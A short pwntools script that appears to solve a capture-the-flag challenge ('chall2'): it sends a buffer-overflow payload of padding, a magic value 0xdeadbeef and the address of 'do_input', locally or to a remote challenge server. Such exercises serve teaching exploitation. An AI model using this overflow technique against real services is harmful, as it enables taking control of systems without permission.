from pwn import *


elf =context.binary = ELF('./chall2')


def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript='')
    else:
        if args.REMOTE:
            return remote('207.154.255.198',4444)
        else:
            return process()    
    

offset =72


p = start()

pay =flat(
    b'a'*60
    ,0xdeadbeef
    ,b'c'*11
    ,elf.sym['do_input']
)


p.sendlineafter(b'?',pay)

p.interactive()